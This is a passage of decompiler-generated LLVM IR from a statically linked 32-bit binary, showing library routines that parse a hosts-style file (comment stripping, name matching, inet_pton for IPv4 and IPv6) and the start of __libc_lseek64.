  %v2_80579bb = inttoptr i32 %arg8 to i32*
  store i32 %v0_80579bb, i32* %v2_80579bb, align 4
  br label %dec_label_pc_8057b19

dec_label_pc_80579ca:                             ; preds = %dec_label_pc_805789e
  store i8* null, i8** %stack_var_-44, align 4
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_80579e9

dec_label_pc_80579e9:                             ; preds = %dec_label_pc_805791b, %dec_label_pc_80579ca
  %v1_80579ed.pre-phi = phi i32* [ %v1_80578ba, %dec_label_pc_805791b ], [ %.pre, %dec_label_pc_80579ca ]
  %stack_var_-32.0 = phi i32 [ %v1_80578e7, %dec_label_pc_805791b ], [ 0, %dec_label_pc_80579ca ]
  %stack_var_-36.0 = phi i32 [ %v1_805789e, %dec_label_pc_805791b ], [ 0, %dec_label_pc_80579ca ]
  %stack_var_-40.0 = phi i32 [ %v0_8057926, %dec_label_pc_805791b ], [ 0, %dec_label_pc_80579ca ]
  %stack_var_4.0 = phi i32 [ %v0_805790e, %dec_label_pc_805791b ], [ %arg1, %dec_label_pc_80579ca ]
  %stack_var_-20.0 = phi i8* [ %v5_8057932, %dec_label_pc_805791b ], [ %v5_80578a4, %dec_label_pc_80579ca ]
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_80579ed.pre-phi, align 4
  %v4_8057b05 = ptrtoint i8* %stack_var_-20.0 to i32
  %v4_8057aa2 = inttoptr i32 %arg2 to i8*
  %v0_8057aff120127 = load i32, i32* @edx, align 4
  %v3_8057b09121128 = call i32 @fgets(i32 %v4_8057b05, i32 %stack_var_4.0, i32 %v0_8057aff120127)
  store i32 %v3_8057b09121128, i32* @eax, align 4
  %v1_8057b11122129 = icmp eq i32 %v3_8057b09121128, 0
  %v1_8057b13123130 = icmp eq i1 %v1_8057b11122129, false
  br i1 %v1_8057b13123130, label %dec_label_pc_8057a00.lr.ph.lr.ph, label %dec_label_pc_8057b19

dec_label_pc_8057a00.lr.ph.lr.ph:                 ; preds = %dec_label_pc_80579e9
  %v12_8057ad7 = icmp eq i32 %arg3, 10
  %v12_8057ab5 = icmp eq i32 %arg3, 2
  %v12_8057a7c = icmp eq i32 %arg4, 2
  %v1_8057a81 = icmp eq i1 %v12_8057a7c, false
  %v1_8057aba = icmp eq i1 %v12_8057ab5, false
  %v1_8057adc = icmp eq i1 %v12_8057ad7, false
  br label %dec_label_pc_8057a00.lr.ph

dec_label_pc_8057a00.lr.ph:                       ; preds = %dec_label_pc_8057a00.lr.ph.lr.ph, %dec_label_pc_8057aff.outer.backedge
  %stack_var_-28.0.ph131 = phi i32 [ 1, %dec_label_pc_8057a00.lr.ph.lr.ph ], [ 2, %dec_label_pc_8057aff.outer.backedge ]
  br label %dec_label_pc_8057a00

dec_label_pc_8057a00:                             ; preds = %dec_label_pc_8057a00.lr.ph, %dec_label_pc_8057aff.backedge
  %v3_8057a08 = call i32 @__GI_strchr(i8* %stack_var_-20.0, i32 35)
  store i32 %v3_8057a08, i32* @eax, align 4
  %v1_8057a10 = icmp eq i32 %v3_8057a08, 0
  br i1 %v1_8057a10, label %dec_label_pc_8057a17, label %dec_label_pc_8057a14

dec_label_pc_8057a14:                             ; preds = %dec_label_pc_8057a00
  %v1_8057a14 = inttoptr i32 %v3_8057a08 to i8*
  store i8 0, i8* %v1_8057a14, align 1
  br label %dec_label_pc_8057a17

dec_label_pc_8057a17:                             ; preds = %dec_label_pc_8057a00, %dec_label_pc_8057a14
  store i32 %v4_8057b05, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_8057a5732 = load i8, i8* %stack_var_-20.0, align 1
  %v3_8057a5733 = icmp eq i8 %v2_8057a5732, 0
  %v1_8057a5a39 = icmp eq i1 %v3_8057a5733, false
  br i1 %v1_8057a5a39, label %dec_label_pc_8057a23.preheader.preheader, label %dec_label_pc_8057a5c

dec_label_pc_8057a23.preheader.preheader:         ; preds = %dec_label_pc_8057a17
  %v4_8057a2397.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8057a23.preheader

dec_label_pc_8057a1f:                             ; preds = %dec_label_pc_8057a29
  store i8 0, i8* %v1_8057a23102, align 1
  %v0_8057a22 = load i32, i32* @ecx, align 4
  %v1_8057a22 = add i32 %v0_8057a22, 1
  store i32 %v1_8057a22, i32* @ecx, align 4
  %v1_8057a23 = inttoptr i32 %v1_8057a22 to i8*
  %v2_8057a23 = load i8, i8* %v1_8057a23, align 1
  %v3_8057a23 = zext i8 %v2_8057a23 to i32
  %v4_8057a23 = load i32, i32* %eax.global-to-local, align 4
  %v5_8057a23 = and i32 %v4_8057a23, -256
  %v6_8057a23 = or i32 %v5_8057a23, %v3_8057a23
  store i32 %v6_8057a23, i32* @eax, align 4
  %v4_8057a25 = icmp eq i8 %v2_8057a23, 0
  br i1 %v4_8057a25, label %dec_label_pc_8057a23.dec_label_pc_8057a5c.loopexit_crit_edge, label %dec_label_pc_8057a29

dec_label_pc_8057a29:                             ; preds = %dec_label_pc_8057a23.preheader, %dec_label_pc_8057a1f
  %v2_8057a23103 = phi i8 [ %v2_8057a23, %dec_label_pc_8057a1f ], [ %v2_8057a2395, %dec_label_pc_8057a23.preheader ]
  %v1_8057a23102 = phi i8* [ %v1_8057a23, %dec_label_pc_8057a1f ], [ %v1_8057a2394, %dec_label_pc_8057a23.preheader ]
  %v0_8057a1f101 = phi i32 [ %v1_8057a22, %dec_label_pc_8057a1f ], [ %v0_8057a2347, %dec_label_pc_8057a23.preheader ]
  %v2_8057a29 = sext i8 %v2_8057a23103 to i32
  store i32 %v2_8057a29, i32* @edx, align 4
  %v0_8057a2c = load i32, i32* @global_var_805d1e8, align 8
  store i32 %v0_8057a2c, i32* %eax.global-to-local, align 4
  %v2_8057a31 = mul nsw i32 %v2_8057a29, 2
  %v3_8057a31 = add i32 %v0_8057a2c, %v2_8057a31
  %v4_8057a31 = inttoptr i32 %v3_8057a31 to i8*
  %v5_8057a31 = load i8, i8* %v4_8057a31, align 1
  %v6_8057a31 = and i8 %v5_8057a31, 32
  %v7_8057a31 = icmp eq i8 %v6_8057a31, 0
  %v1_8057a35 = icmp eq i1 %v7_8057a31, false
  br i1 %v1_8057a35, label %dec_label_pc_8057a1f, label %dec_label_pc_8057a37

dec_label_pc_8057a37:                             ; preds = %dec_label_pc_8057a29
  %v0_8057a37 = load i32, i32* @edi, align 4
  %v1_8057a37 = add i32 %v0_8057a37, -6
  %v6_8057a37 = sub i32 5, %v0_8057a37
  %v7_8057a37 = and i32 %v6_8057a37, %v0_8057a37
  %v8_8057a37 = icmp slt i32 %v7_8057a37, 0
  %v9_8057a37 = icmp eq i32 %v1_8057a37, 0
  %v10_8057a37 = icmp slt i32 %v1_8057a37, 0
  %v3_8057a3a = icmp eq i1 %v10_8057a37, %v8_8057a37
  %v4_8057a3a = icmp eq i1 %v9_8057a37, false
  %v5_8057a3a = and i1 %v4_8057a3a, %v3_8057a3a
  br i1 %v5_8057a3a, label %dec_label_pc_8057a43.preheader, label %dec_label_pc_8057a3c

dec_label_pc_8057a3c:                             ; preds = %dec_label_pc_8057a37
  %v1_8057a3c = load i32, i32* @ebx, align 4
  %v3_8057a3c = mul i32 %v0_8057a37, 4
  %v4_8057a3c = add i32 %v1_8057a3c, %v3_8057a3c
  %v5_8057a3c = inttoptr i32 %v4_8057a3c to i32*
  store i32 %v0_8057a1f101, i32* %v5_8057a3c, align 4
  %v0_8057a3f = load i32, i32* @edi, align 4
  %v1_8057a3f = add i32 %v0_8057a3f, 1
  store i32 %v1_8057a3f, i32* @edi, align 4
  %v0_8057a43.pre.pre = load i32, i32* @ecx, align 4
  %v4_8057a43.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057a43.preheader

dec_label_pc_8057a43.preheader:                   ; preds = %dec_label_pc_8057a3c, %dec_label_pc_8057a37
  %v4_8057a43.pre = phi i32 [ %v4_8057a43.pre.pre, %dec_label_pc_8057a3c ], [ %v0_8057a2c, %dec_label_pc_8057a37 ]
  %v0_8057a43.pre = phi i32 [ %v0_8057a43.pre.pre, %dec_label_pc_8057a3c ], [ %v0_8057a1f101, %dec_label_pc_8057a37 ]
  %v1_8057a5c52 = phi i32 [ %v1_8057a3f, %dec_label_pc_8057a3c ], [ %v0_8057a37, %dec_label_pc_8057a37 ]
  %v1_8057a43104 = inttoptr i32 %v0_8057a43.pre to i8*
  %v2_8057a43105 = load i8, i8* %v1_8057a43104, align 1
  %v3_8057a43106 = zext i8 %v2_8057a43105 to i32
  %v5_8057a43107 = and i32 %v4_8057a43.pre, -256
  %v6_8057a43108 = or i32 %v3_8057a43106, %v5_8057a43107
  store i32 %v6_8057a43108, i32* @eax, align 4
  %v4_8057a45109 = icmp eq i8 %v2_8057a43105, 0
  br i1 %v4_8057a45109, label %dec_label_pc_8057a57.loopexit, label %dec_label_pc_8057a49.lr.ph

dec_label_pc_8057a49.lr.ph:                       ; preds = %dec_label_pc_8057a43.preheader
  %v0_8057a4c.pre = load i32, i32* @global_var_805d1e8, align 8
  br label %dec_label_pc_8057a49

dec_label_pc_8057a42:                             ; preds = %dec_label_pc_8057a49
  %v1_8057a42 = add i32 %v0_8057a57110, 1
  store i32 %v1_8057a42, i32* @ecx, align 4
  %v1_8057a43 = inttoptr i32 %v1_8057a42 to i8*
  %v2_8057a43 = load i8, i8* %v1_8057a43, align 1
  %v3_8057a43 = zext i8 %v2_8057a43 to i32
  %v5_8057a43 = and i32 %v0_8057a4c.pre, -256
  %v6_8057a43 = or i32 %v3_8057a43, %v5_8057a43
  store i32 %v6_8057a43, i32* @eax, align 4
  %v4_8057a45 = icmp eq i8 %v2_8057a43, 0
  br i1 %v4_8057a45, label %dec_label_pc_8057a57.loopexit, label %dec_label_pc_8057a49

dec_label_pc_8057a49:                             ; preds = %dec_label_pc_8057a49.lr.ph, %dec_label_pc_8057a42
  %v2_8057a43112 = phi i8 [ %v2_8057a43105, %dec_label_pc_8057a49.lr.ph ], [ %v2_8057a43, %dec_label_pc_8057a42 ]
  %v1_8057a43111 = phi i8* [ %v1_8057a43104, %dec_label_pc_8057a49.lr.ph ], [ %v1_8057a43, %dec_label_pc_8057a42 ]
  %v0_8057a57110 = phi i32 [ %v0_8057a43.pre, %dec_label_pc_8057a49.lr.ph ], [ %v1_8057a42, %dec_label_pc_8057a42 ]
  %v2_8057a49 = sext i8 %v2_8057a43112 to i32
  store i32 %v2_8057a49, i32* @edx, align 4
  store i32 %v0_8057a4c.pre, i32* @eax, align 4
  %v2_8057a51 = mul nsw i32 %v2_8057a49, 2
  %v3_8057a51 = add i32 %v0_8057a4c.pre, %v2_8057a51
  %v4_8057a51 = inttoptr i32 %v3_8057a51 to i8*
  %v5_8057a51 = load i8, i8* %v4_8057a51, align 1
  %v6_8057a51 = and i8 %v5_8057a51, 32
  %v7_8057a51 = icmp eq i8 %v6_8057a51, 0
  br i1 %v7_8057a51, label %dec_label_pc_8057a42, label %dec_label_pc_8057a57.loopexit

dec_label_pc_8057a57.loopexit:                    ; preds = %dec_label_pc_8057a49, %dec_label_pc_8057a42, %dec_label_pc_8057a43.preheader
  %v4_8057a2397144 = phi i32 [ %v6_8057a43108, %dec_label_pc_8057a43.preheader ], [ %v6_8057a43, %dec_label_pc_8057a42 ], [ %v0_8057a4c.pre, %dec_label_pc_8057a49 ]
  %v0_8057a57.lcssa = phi i32 [ %v0_8057a43.pre, %dec_label_pc_8057a43.preheader ], [ %v1_8057a42, %dec_label_pc_8057a42 ], [ %v0_8057a57110, %dec_label_pc_8057a49 ]
  %v1_8057a43.lcssa = phi i8* [ %v1_8057a43104, %dec_label_pc_8057a43.preheader ], [ %v1_8057a43, %dec_label_pc_8057a42 ], [ %v1_8057a43111, %dec_label_pc_8057a49 ]
  %v2_8057a57 = load i8, i8* %v1_8057a43.lcssa, align 1
  %v3_8057a57 = icmp eq i8 %v2_8057a57, 0
  %v1_8057a5a = icmp eq i1 %v3_8057a57, false
  br i1 %v1_8057a5a, label %dec_label_pc_8057a23.preheader, label %dec_label_pc_8057a5c

dec_label_pc_8057a23.preheader:                   ; preds = %dec_label_pc_8057a23.preheader.preheader, %dec_label_pc_8057a57.loopexit
  %v1_8057a5c.pre147 = phi i32 [ %v1_8057a5c52, %dec_label_pc_8057a57.loopexit ], [ 0, %dec_label_pc_8057a23.preheader.preheader ]
  %v4_8057a2397 = phi i32 [ %v4_8057a2397144, %dec_label_pc_8057a57.loopexit ], [ %v4_8057a2397.pre, %dec_label_pc_8057a23.preheader.preheader ]
  %v0_8057a2347 = phi i32 [ %v0_8057a57.lcssa, %dec_label_pc_8057a57.loopexit ], [ %v4_8057b05, %dec_label_pc_8057a23.preheader.preheader ]
  %v1_8057a2394 = inttoptr i32 %v0_8057a2347 to i8*
  %v2_8057a2395 = load i8, i8* %v1_8057a2394, align 1
  %v3_8057a2396 = zext i8 %v2_8057a2395 to i32
  %v5_8057a2398 = and i32 %v4_8057a2397, -256
  %v6_8057a2399 = or i32 %v5_8057a2398, %v3_8057a2396
  store i32 %v6_8057a2399, i32* @eax, align 4
  %v4_8057a25100 = icmp eq i8 %v2_8057a2395, 0
  br i1 %v4_8057a25100, label %dec_label_pc_8057a5c, label %dec_label_pc_8057a29

dec_label_pc_8057a23.dec_label_pc_8057a5c.loopexit_crit_edge: ; preds = %dec_label_pc_8057a1f
  %v1_8057a5c.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8057a5c

dec_label_pc_8057a5c:                             ; preds = %dec_label_pc_8057a57.loopexit, %dec_label_pc_8057a23.dec_label_pc_8057a5c.loopexit_crit_edge, %dec_label_pc_8057a23.preheader, %dec_label_pc_8057a17
  %v1_8057a5c = phi i32 [ 0, %dec_label_pc_8057a17 ], [ %v1_8057a5c.pre.pre, %dec_label_pc_8057a23.dec_label_pc_8057a5c.loopexit_crit_edge ], [ %v1_8057a5c.pre147, %dec_label_pc_8057a23.preheader ], [ %v1_8057a5c52, %dec_label_pc_8057a57.loopexit ]
  %v0_8057a5c = load i32, i32* @ebx, align 4
  %v2_8057a5c = mul i32 %v1_8057a5c, 4
  %v3_8057a5c = add i32 %v2_8057a5c, %v0_8057a5c
  %v4_8057a5c = inttoptr i32 %v3_8057a5c to i32*
  store i32 0, i32* %v4_8057a5c, align 4
  %v0_8057a63 = load i32, i32* @edi, align 4
  %v7_8057a66 = icmp sgt i32 %v0_8057a63, 1
  br i1 %v7_8057a66, label %dec_label_pc_8057a6c, label %dec_label_pc_8057aff.backedge

dec_label_pc_8057a6c:                             ; preds = %dec_label_pc_8057a5c
  br i1 %v12_80578a8, label %dec_label_pc_8057b39, label %dec_label_pc_8057a77

dec_label_pc_8057a77:                             ; preds = %dec_label_pc_8057a6c
  store i32 1, i32* @esi, align 4
  br i1 %v1_8057a81, label %dec_label_pc_8057a99.lr.ph, label %dec_label_pc_8057a83

dec_label_pc_8057a99.lr.ph:                       ; preds = %dec_label_pc_8057a77
  %v0_8057a99.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8057a99

dec_label_pc_8057a83:                             ; preds = %dec_label_pc_8057a77
  %v0_8057a83 = load i32, i32* @eax, align 4
  %v0_8057a85 = load i32, i32* @ebx, align 4
  %v1_8057a85 = inttoptr i32 %v0_8057a85 to i32*
  %v2_8057a85 = load i32, i32* %v1_8057a85, align 4
  %v5_8057a8b = call i32 @__GI_strcoll(i8* %v4_8057aa2, i32 %v2_8057a85, i32 %v0_8057a83, i32 %v0_8057a83)
  store i32 %v5_8057a8b, i32* %eax.global-to-local, align 4
  %v1_8057a93 = icmp eq i32 %v5_8057a8b, 0
  %v1_8057a95 = icmp eq i1 %v1_8057a93, false
  br i1 %v1_8057a95, label %dec_label_pc_8057aff.backedge, label %dec_label_pc_8057ab5

dec_label_pc_8057aff.backedge:                    ; preds = %dec_label_pc_8057aae, %dec_label_pc_8057a83, %dec_label_pc_8057a5c
  %v0_8057aff = load i32, i32* @edx, align 4
  %v3_8057b09 = call i32 @fgets(i32 %v4_8057b05, i32 %stack_var_4.0, i32 %v0_8057aff)
  store i32 %v3_8057b09, i32* @eax, align 4
  %v1_8057b11 = icmp eq i32 %v3_8057b09, 0
  %v1_8057b13 = icmp eq i1 %v1_8057b11, false
  br i1 %v1_8057b13, label %dec_label_pc_8057a00, label %dec_label_pc_8057b19

dec_label_pc_8057a99:                             ; preds = %dec_label_pc_8057a99.lr.ph, %dec_label_pc_8057aae
  %v0_8057a99 = phi i32 [ %v0_8057a99.pre, %dec_label_pc_8057a99.lr.ph ], [ %v5_8057aa2, %dec_label_pc_8057aae ]
  %v1_8057a9b119 = phi i32 [ 1, %dec_label_pc_8057a99.lr.ph ], [ %v1_8057aae, %dec_label_pc_8057aae ]
  %v0_8057a9b = load i32, i32* @ebx, align 4
  %v2_8057a9b = mul i32 %v1_8057a9b119, 4
  %v3_8057a9b = add i32 %v0_8057a9b, %v2_8057a9b
  %v4_8057a9b = inttoptr i32 %v3_8057a9b to i32*
  %v5_8057a9b = load i32, i32* %v4_8057a9b, align 4
  %v5_8057aa2 = call i32 @__GI_strcasecmp(i8* %v4_8057aa2, i32 %v5_8057a9b, i32 %v0_8057a99, i32 %v0_8057a99)
  store i32 %v5_8057aa2, i32* %eax.global-to-local, align 4
  %v1_8057aaa = icmp eq i32 %v5_8057aa2, 0
  br i1 %v1_8057aaa, label %dec_label_pc_8057ab5, label %dec_label_pc_8057aae

dec_label_pc_8057aae:                             ; preds = %dec_label_pc_8057a99
  %v0_8057aae = load i32, i32* @esi, align 4
  %v1_8057aae = add i32 %v0_8057aae, 1
  store i32 %v1_8057aae, i32* @esi, align 4
  %v1_8057aaf.pre = load i32, i32* @edi, align 4
  %v5_8057ab1 = icmp slt i32 %v1_8057aae, %v1_8057aaf.pre
  br i1 %v5_8057ab1, label %dec_label_pc_8057a99, label %dec_label_pc_8057aff.backedge

dec_label_pc_8057ab5:                             ; preds = %dec_label_pc_8057a83, %dec_label_pc_8057a99
  br i1 %v1_8057aba, label %dec_label_pc_8057ad7, label %dec_label_pc_8057abc

dec_label_pc_8057abc:                             ; preds = %dec_label_pc_8057ab5
  %v0_8057abc = load i32, i32* @esi, align 4
  %v3_8057abd = load i8*, i8** %stack_var_-44, align 4
  %v4_8057abd = ptrtoint i8* %v3_8057abd to i32
  %v0_8057ac1 = load i32, i32* @ebx, align 4
  %v1_8057ac1 = inttoptr i32 %v0_8057ac1 to i32*
  %v2_8057ac1 = load i32, i32* %v1_8057ac1, align 4
  %v4_8057ac5 = inttoptr i32 %v2_8057ac1 to i8*
  %v5_8057ac5 = call i32 @inet_pton(i32 2, i8* %v4_8057ac5, i32 %v4_8057abd, i32 %v0_8057abc)
  store i32 %v5_8057ac5, i32* %eax.global-to-local, align 4
  %tmp84 = icmp slt i32 %v5_8057ac5, 1
  %tmp85 = icmp eq i1 %tmp84, false
  br i1 %tmp85, label %dec_label_pc_8057955, label %dec_label_pc_8057aff.outer.backedge

dec_label_pc_8057aff.outer.backedge:              ; preds = %dec_label_pc_8057abc, %dec_label_pc_8057ade, %dec_label_pc_8057ad7
  %v0_8057aff120 = load i32, i32* @edx, align 4
  %v3_8057b09121 = call i32 @fgets(i32 %v4_8057b05, i32 %stack_var_4.0, i32 %v0_8057aff120)
  store i32 %v3_8057b09121, i32* @eax, align 4
  %v1_8057b11122 = icmp eq i32 %v3_8057b09121, 0
  %v1_8057b13123 = icmp eq i1 %v1_8057b11122, false
  br i1 %v1_8057b13123, label %dec_label_pc_8057a00.lr.ph, label %dec_label_pc_8057b19

dec_label_pc_8057ad7:                             ; preds = %dec_label_pc_8057ab5
  br i1 %v1_8057adc, label %dec_label_pc_8057aff.outer.backedge, label %dec_label_pc_8057ade

dec_label_pc_8057ade:                             ; preds = %dec_label_pc_8057ad7
  %v0_8057ade = load i32, i32* @ecx, align 4
  %v0_8057ae3 = load i32, i32* @ebx, align 4
  %v1_8057ae3 = inttoptr i32 %v0_8057ae3 to i32*
  %v2_8057ae3 = load i32, i32* %v1_8057ae3, align 4
  %v4_8057ae7 = inttoptr i32 %v2_8057ae3 to i8*
  %v5_8057ae7 = call i32 @inet_pton(i32 10, i8* %v4_8057ae7, i32 %stack_var_-36.0, i32 %v0_8057ade)
  store i32 %v5_8057ae7, i32* %eax.global-to-local, align 4
  %tmp86 = icmp slt i32 %v5_8057ae7, 1
  %tmp87 = icmp eq i1 %tmp86, false
  br i1 %tmp87, label %dec_label_pc_8057982, label %dec_label_pc_8057aff.outer.backedge

dec_label_pc_8057b19:                             ; preds = %dec_label_pc_8057aff.outer.backedge, %dec_label_pc_80579e9, %dec_label_pc_8057aff.backedge, %dec_label_pc_80579ae
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_80579ae ], [ 1, %dec_label_pc_80579e9 ], [ 2, %dec_label_pc_8057aff.outer.backedge ], [ %stack_var_-28.0.ph131, %dec_label_pc_8057aff.backedge ]
  br i1 %v12_80578a8, label %dec_label_pc_8057b39, label %dec_label_pc_8057b20

dec_label_pc_8057b20:                             ; preds = %dec_label_pc_8057b19
  %v1_8057b27 = inttoptr i32 %stack_var_4.0 to i16*
  %v2_8057b27 = call i32 @__GI_fclose(i16* %v1_8057b27)
  store i32 %v2_8057b27, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057b39

dec_label_pc_8057b39:                             ; preds = %dec_label_pc_8057a6c, %dec_label_pc_8057889, %dec_label_pc_8057895, %dec_label_pc_80578b3, %dec_label_pc_80578c6, %dec_label_pc_80578d2, %dec_label_pc_80578db, %dec_label_pc_8057905, %dec_label_pc_8057b19, %dec_label_pc_8057b20, %dec_label_pc_805793b
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_8057b19 ], [ %stack_var_-28.1, %dec_label_pc_8057b20 ], [ %v2_805794a, %dec_label_pc_805793b ], [ 34, %dec_label_pc_8057905 ], [ 34, %dec_label_pc_80578db ], [ 34, %dec_label_pc_80578d2 ], [ 34, %dec_label_pc_80578c6 ], [ 34, %dec_label_pc_80578b3 ], [ 34, %dec_label_pc_8057895 ], [ 34, %dec_label_pc_8057889 ], [ %stack_var_-28.0.ph131, %dec_label_pc_8057a6c ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_8057874, i32* @ebx, align 4
  store i32 %v0_8057873, i32* @esi, align 4
  store i32 %v0_8057872, i32* @edi, align 4
  store i32 %v0_8057871, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v1_8057aae, { 0, 2, 1 }
  uselistorder i32 %v5_8057aa2, { 1, 2, 0 }
  uselistorder i32 %v0_8057a99, { 1, 0 }
  uselistorder i8 %v2_8057a2395, { 1, 2, 0 }
  uselistorder i8* %v1_8057a2394, { 1, 0 }
  uselistorder i32 %v0_8057a2347, { 1, 0 }
  uselistorder i32 %v2_8057a49, { 1, 0 }
  uselistorder i32 %v1_8057a42, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8057a4c.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_8057a37, { 1, 0 }
  uselistorder i32 %v0_8057a37, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8057a29, { 1, 0 }
  uselistorder i8* %v4_8057aa2, { 1, 0 }
  uselistorder i32 %v4_8057b05, { 1, 4, 2, 3, 0 }
  uselistorder i32 %stack_var_4.0, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0 }
  uselistorder i32 %v0_80578c6, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80578a1, { 1, 0 }
  uselistorder i32 %v1_8057884, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 3, 2, 1, 0 }
  uselistorder i32 %tmp59, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 6, 7, 0, 1, 2, 3, 4, 8, 9, 10, 11, 12, 14, 13, 15 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 8, 9, 10, 12, 13, 11, 2, 3, 5, 6, 7, 14, 17, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32 34, { 3, 4, 5, 6, 7, 8, 9, 12, 13, 14, 15, 11, 1, 2, 17, 18, 16, 10, 0 }
  uselistorder i32 5, { 23, 29, 30, 31, 0, 22, 11, 12, 24, 13, 33, 34, 2, 5, 32, 6, 7, 21, 14, 25, 15, 8, 26, 9, 27, 16, 10, 28, 17, 18, 19, 3, 4, 20, 1 }
  uselistorder i32 -6, { 1, 0 }
  uselistorder i8 32, { 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 1, 13, 2, 23, 24, 7, 11, 3, 4, 8, 12, 5, 6, 9, 10 }
  uselistorder i32* @global_var_805d1e8, { 0, 4, 2, 5, 1, 3, 6, 7 }
  uselistorder i32 35, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 4, 0, 3, 2 }
  uselistorder i32 10, { 24, 2, 35, 36, 37, 38, 39, 40, 3, 29, 30, 32, 31, 4, 8, 41, 9, 42, 11, 10, 25, 5, 13, 28, 33, 12, 43, 26, 0, 22, 23, 14, 15, 27, 21, 20, 19, 17, 18, 1, 34, 6, 44, 45, 16, 7 }
  uselistorder i32 80, { 0, 2, 4, 5, 6, 7, 8, 9, 10, 11, 3, 1 }
  uselistorder i32 56, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 2, 1, 14, 15, 0 }
  uselistorder i32 44, { 11, 12, 13, 10, 14, 15, 16, 26, 17, 18, 9, 23, 25, 24, 20, 21, 22, 19, 2, 3, 4, 5, 1, 6, 7, 8, 0 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 48, { 15, 14, 4, 10, 5, 2, 16, 17, 0, 11, 7, 6, 3, 13, 8, 9, 18, 19, 20, 21, 1, 12 }
  uselistorder i32 -48, { 2, 3, 5, 1, 4, 0 }
  uselistorder i32 -32, { 17, 0, 1, 15, 16, 3, 2, 4, 5, 6, 10, 9, 8, 7, 11, 12, 13, 14 }
  uselistorder i32 32, { 72, 33, 73, 74, 32, 38, 75, 76, 77, 78, 79, 56, 80, 81, 82, 54, 55, 83, 30, 102, 39, 63, 70, 71, 66, 31, 1, 0, 2, 3, 57, 4, 64, 5, 6, 7, 8, 9, 10, 34, 84, 85, 35, 86, 87, 88, 89, 90, 91, 92, 11, 93, 94, 58, 100, 101, 99, 65, 67, 68, 13, 12, 45, 15, 14, 44, 17, 16, 46, 69, 42, 18, 59, 60, 19, 61, 36, 21, 20, 47, 23, 22, 48, 43, 40, 37, 49, 24, 25, 27, 26, 50, 52, 29, 28, 51, 95, 96, 97, 98, 53, 41, 62 }
  uselistorder i32* @ebp, { 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 10, 11, 12, 1, 13, 14, 15, 4, 63, 64, 65, 70, 66, 67, 68, 69, 71, 72, 2, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 95, 94, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 30, 31, 16, 17, 18, 35, 36, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 178, 174, 175, 176, 177, 3, 179, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 5, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 0, 141, 7, 8, 9, 32, 33, 34, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 6, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 153, 154, 155, 156, 157, 158, 159, 160, 180, 181, 182, 183 }
  uselistorder i32 %arg9, { 3, 0, 1, 2 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8057b39, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_8057b19, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8057aff.outer.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8057ab5, { 1, 0 }
  uselistorder label %dec_label_pc_8057a99, { 1, 0 }
  uselistorder label %dec_label_pc_8057a5c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_8057a23.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8057a49, { 1, 0 }
  uselistorder label %dec_label_pc_8057a17, { 1, 0 }
  uselistorder label %dec_label_pc_8057a00, { 1, 0 }
  uselistorder label %dec_label_pc_8057a00.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_80579e9, { 1, 0 }
  uselistorder label %dec_label_pc_80579ae, { 1, 0 }
  uselistorder label %dec_label_pc_8057905, { 1, 0 }
  uselistorder label %dec_label_pc_8057895, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8057b4a = load i32, i32* @ebx, align 4
  store i32 %v0_8057b4a, i32* %stack_var_-12, align 4
  %v2_8057b5e = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8057b5e, i32* %esi.global-to-local, align 4
